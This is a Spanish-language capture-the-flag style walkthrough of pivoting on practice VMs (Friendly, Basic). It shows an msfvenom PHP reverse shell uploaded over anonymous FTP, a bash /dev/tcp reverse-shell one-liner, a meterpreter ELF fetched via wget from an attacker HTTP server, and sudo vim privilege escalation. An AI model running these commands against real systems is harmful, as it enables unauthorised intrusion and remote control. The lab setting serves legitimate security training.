# Pivoting en Entornos Linux - Parte 1

Maquinas que vamos a utilizar **Kali Linux , Friendly y Basic.**

[https://hackmyvm.eu/machines/machine.php?vm=Friendly](https://hackmyvm.eu/machines/machine.php?vm=Friendly)

[VulNyx | Offensive Security Playground](./imagenes/https://vulnyx.com/#basic)

- Configuramos las redes en VirtualBox **Archivos → Herramientas → Administrador de red.**
    - Tenemos que tener creadas dos redes.
        1. Red **Pedro → 10.0.3.0/24**
            
            ![image.png](./imagenes/image%205.png)
            
        
        1. Red **Red_Pivoting → 10.10.10.0/24**
            
            ![image.png](./imagenes/image%206.png)
            
    
    - Los adaptadores de red de las maquinas quedarían asi.
        1. Maquina Kali quedaría así:
            
            ![image.png](./imagenes/image%207.png)
            
            En la Kali Linux me tendría que aparecer una IP dentro del rango de red que le había asignado. Lo veríamos con `ifconfig`.
            
            ![image.png](./imagenes/image%2041.png)
            
        
        1. Maquina Friendly:
            
            ![image.png](./imagenes/image%2042.png)
            
            ![image.png](./imagenes/image%2043.png)
            
            ![image.png](./imagenes/image%2044.png)
            
        
        1. La maquina Basic:
            
            ![image.png](./imagenes/image%2045.png)
            
            ![image.png](./imagenes/image%2046.png)
            

![image.png](./imagenes/image%2047.png)

- Empezamos con la intrusión de la maquina Friendly.
    
    ```bash
    sudo arp-scan -I eth0 --localnet
    ```
    
    ![image.png](./imagenes/image%2048.png)
    

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.21
```

![image.png](./imagenes/image%2049.png)

- Miramos el puerto 80 en el navegador web
    
    ![image.png](./imagenes/image%2050.png)
    
    Vemos que esta corriendo una plantilla FTP
    
- Vemos también que tiene el puerto 21 abierto  con el FTP con el **anonymous** habilitado. Lo probamos.
    
    ![image.png](./imagenes/image%2051.png)
    
    ```bash
    ftp 10.0.3.21 
    ```
    
    `ls`
    
    ![image.png](./imagenes/image%2052.png)
    
    Listamos fichero y vemos un **index.html** que suele ser la pagina de inicio de una web. Salimos con `exit`.
    

- Vamos a crear un Payload con msfvenom.
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > pwned.php  
    ```
    
    ![image.png](./imagenes/image%2053.png)
    

- Volvemos a entrar en el FTP y hacemos un `put` del archivo que acabamos de crear.
    
    ```bash
    ftp 10.0.3.21
    ```
    
    `put pwned.php`
    
    ![image.png](./imagenes/image%2054.png)
    
    Salimos con `exit`.
    
- Nos ponemos a la escucha con netcat
    
    ```bash
    nc -nlvp 443 
    ```
    
    ![image.png](./imagenes/image%2055.png)
    

- En el navegador web escribimos [http://10.0.3.21/pwned.php](./imagenes/http://10.0.3.21/pwned.php) para ejecutar el payload.
    
    ![image.png](./imagenes/image%2056.png)
    
    ![image.png](./imagenes/image%2057.png)
    

- Como la conexión creada con msfvenom no es muy estable vamos a estabilizarla. Vamos a la web de [https://www.revshells.com/](./imagenes/https://www.revshells.com/) y ponemos los datos que necesitamos para crear un código para estabilizar.
    
    ![image.png](./imagenes/image%2058.png)
    

- Nos ponemos a la escucha por el puerto 444 con netcat.
    
    ```bash
    nc -nlvp 444 
    ```
    
    ![image.png](./imagenes/image%2059.png)
    

- En la conexión del puerto 443 escribimos lo siguiente:
    
    `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
    
    ![image.png](./imagenes/image%2060.png)
    
    ![image.png](./imagenes/image%2061.png)
    
    Cerramos el terminal de la conexión 443 que no la vamos a necesitar.
    
- Abrimos otro terminal , nos movemos al escritorio y nos creamos un payload con msfvemon.
    
    Lo que vamos ha hacer es crear un ejecutable que directamente nos de una sesión de meterpreter en Metasploit.
    
    ```bash
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.3.4 LPORT=4444 -f elf -b '\x00\x0a\x0d' -o virus
    ```
    
    ![image.png](./imagenes/image%2062.png)
    

- Creamos un servidor web con Python para compartir el archivo con la maquina victima.
    
    ```bash
    python3 -m http.server 80
    ```
    
    ![image.png](./imagenes/image%2063.png)
    
- Nos vamos al terminal donde habíamos conseguido entrar y nos subimos el archivo a la maquina victima.
    
    `wget 10.0.3.4/virus`
    
    ![image.png](./imagenes/image%2064.png)
    

- Abrimos el Metasploit
    
    ![image.png](./imagenes/image%2065.png)
    
    - Cargamos el **multi/handler**
        
        `use /multi/handler`
        
        ![image.png](./imagenes/image%2066.png)
        

- Miramos las opciones y ponemos las que necesitemos. Tenemos que tener qen cuenta que **debemos cambiar también el payload por que no es el mismo que el de nuestro archivo virus.**
    
    `set PAYLOAD linux/x86/meterpreter/reverse_tcp`
    
    `set LHOST 10.0.3.4`
    
    `show options`
    
    ![image.png](./imagenes/image%2067.png)
    

- Lo ejecutamos para ponerlo a la escucha.
    
    `run`
    
    ![image.png](./imagenes/image%2068.png)
    

- En el terminal de la maquina intermedia ejecutamos el archivo virus
    
    `ls`
    
    `chmod +x virus`
    
    `./virus`
    
    ![image.png](./imagenes/image%2069.png)
    

- Ya tendríamos abierta la sesión de meterpreter en la maquina intermedia.
    
    <aside>
    💡
    
    Hemos hecho todo esto para abrir la sesión de meterpreter por que para hacer Pivoting es necesario hacerlo desde un meterpreter. 
    
    </aside>
    
    ![image.png](./imagenes/image%2070.png)
    

<aside>
💡

Pero tenemos un grabe problema si miramos quien soy con **whoami**  veremos que **no soy root**  y no podemos hacer **pivoting sin ser root**. Con esto vemos **la importancia de ser root.**

</aside>

`shell`

`whoami`

![image.png](./imagenes/image%2071.png)

- Hacemos exit.
    
    `exit`
    
    `exit`
    
    ![image.png](./imagenes/image%2072.png)
    

- En el terminal de la maquina intermedia empezamos a escalar privilegios.
    
    `whoami`
    
    `sudo -l`
    
    ![image.png](./imagenes/image%2073.png)
    
    - Hacemos un tratamiento mínimo de la TTY
        
        `script /dev/null -c bash`
        
        ![image.png](./imagenes/image%2074.png)
        
- Nos vamos a la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/) y **miramos Vim con Sudo.**
    
    ![image.png](./imagenes/image%2075.png)
    
- Probamos el primer comando que nos muestra para ver si podemos conseguir una shell como root
    
    `sudo vim -c ':!/bin/sh'`
    
    `whoami`
    
    ![image.png](./imagenes/image%2076.png)
    
- Volvemos a Metasploit y ejecutamos el **multi/handler** de nuevo**.**
    
    `run`
    
    ![image.png](./imagenes/image%2077.png)
    

- Y en el Terminal de la maquina intermedia volvemos a lanzar el archivo virus.
    
    `./virus`
    
    ![image.png](./imagenes/image%2078.png)
    
    En el Metasploit
    
    ![image.png](./imagenes/image%2079.png)
    

<aside>
💡

Debemos recordar que para hacer pivoting necesitamos un meterpreter no una shell. por tanto debemos alternar entre ellos con el comando `shell` para tener una shell y con el comando `exit` para salir del la shell al meterpreter.

</aside>